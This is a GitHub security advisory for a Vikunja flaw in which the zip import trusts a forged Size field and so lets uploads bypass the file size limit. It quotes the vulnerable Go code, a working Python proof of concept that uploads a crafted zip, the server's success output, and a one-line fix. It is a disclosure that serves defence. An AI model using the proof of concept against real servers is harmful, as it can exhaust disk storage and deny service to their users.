# [M] Vikunja has File Size Limit Bypass via Vikunja Import

## Summary
Severity: Medium
Advisory: GHSA-qh78-rvg3-cv54
CVE: CVE-2026-35602
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-qh78-rvg3-cv54
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The Vikunja file import endpoint uses the attacker-controlled `Size` field from the JSON metadata inside the import zip instead of the actual decompressed file content length for the file size enforcement check. By setting `Size` to 0 in the JSON while including large compressed file entries in the zip, an attacker bypasses the configured maximum file size limit.

## Details

During import, the JSON metadata from `data.json` inside the zip archive is deserialized into project structures. File content is read independently from the zip entries. When creating attachments, the code at `pkg/modules/migration/create_from_structure.go:406` passes the attacker-controlled `File.Size` from the JSON:

```go
err = a.NewAttachment(s, bytes.NewReader(a.File.FileContent), a.File.Name, a.File.Size, user)
```

The file size enforcement check at `pkg/files/files.go:118` then evaluates this attacker-controlled value:

```go
if realsize > config.GetMaxFileSizeInMBytes()*uint64(datasize.MB) && checkFileSizeLimit {
```

With `Size` set to 0 in the JSON, the comparison `0 > 20MB` evaluates to false and the check passes. The actual file content (from the zip entry) can be up to 500MB per entry (the `readZipEntry` limit). Highly compressible content like zero-filled buffers achieves extreme compression ratios, allowing a small zip upload to store gigabytes of data.

## Proof of Concept

Tested on Vikunja v2.2.2 with default `max_file_size: 20MB`.

```python
import zipfile, io, json, requests

TARGET = "http://localhost:3456"
token = requests.post(f"{TARGET}/api/v1/login",
    json={"username": "user1", "password": "User1pass!"}).json()["token"]
h = {"Authorization": f"Bearer {token}"}

# Craft zip with forged Size=0 in JSON but 25MB actual content
large_content = b"A" * (25 * 1024 * 1024)  # 25MB
data = [{"title": "Project", "tasks": [{"title": "Task", "attachments": [{
    "file": {"name": "large.bin", "size": 0, "created": "2026-01-01T00:00:00Z"},
    "created": "2026-01-01T00:00:00Z"}]}]}]

zip_buf = io.BytesIO()
with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("VERSION", "2.2.2")
    zf.writestr("data.json", json.dumps(data))
    zf.writestr("large.bin", large_content)

resp = requests.put(f"{TARGET}/api/v1/migration/vikunja-file/migrate",
    headers=h,
    files={"import": ("export.zip", zip_buf.getvalue(), "application/zip")})
```

Output:
```
HTTP 200: {"message": "Everything was migrated successfully."}
25MB file stored despite 20MB server limit.
```

## Impact

An authenticated user can exhaust server storage by uploading small compressed zip files that decompress into files exceeding the configured maximum file size limit. A single ~25KB upload can store ~25MB due to zip compression ratios. Repeated exploitation can fill the server's disk, causing denial of service for all users. No per-user storage quota exists to contain the impact.

## Recommended Fix

Use the actual content length instead of the attacker-controlled `Size` field:

```go
err = a.NewAttachment(s, bytes.NewReader(a.File.FileContent), a.File.Name, uint64(len(a.File.FileContent)), user)
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qh78-rvg3-cv54
- https://nvd.nist.gov/vuln/detail/CVE-2026-35602
- https://github.com/go-vikunja/vikunja/pull/2575
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
